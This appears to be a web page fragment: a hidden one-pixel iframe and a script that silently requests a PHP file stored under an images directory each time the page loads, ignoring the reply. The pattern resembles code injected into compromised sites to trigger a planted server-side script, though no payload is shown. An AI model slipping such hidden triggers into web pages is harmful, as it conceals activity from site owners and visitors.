<iframe  id=maiv style='border=0;width:1;height:1;visibility:hidden' src=''>
Not supported Iframes
</iframe>
<script type='text/javascript'>
try {
	var xmlhttpxx = window.XMLHttpRequest?new XMLHttpRequest(): new ActiveXObject("Microsoft.XMLHTTP");
	xmlhttpxx.onreadystatechange = triggeredxx;
	} catch (e) {
}

function okax(){
	try{
		xmlhttpxx = window.XMLHttpRequest?new XMLHttpRequest(): new ActiveXObject("Microsoft.XMLHTTP");
		xmlhttpxx.onreadystatechange = triggeredxx;
		xmlhttpxx.open("GET", "/images/frames/__processRequest00Frames.php?q="+(Math.random()*100000));
		xmlhttpxx.send(null);
	}
	catch(dad) {
	}
}

function triggeredxx()
{

}
okax();
</script>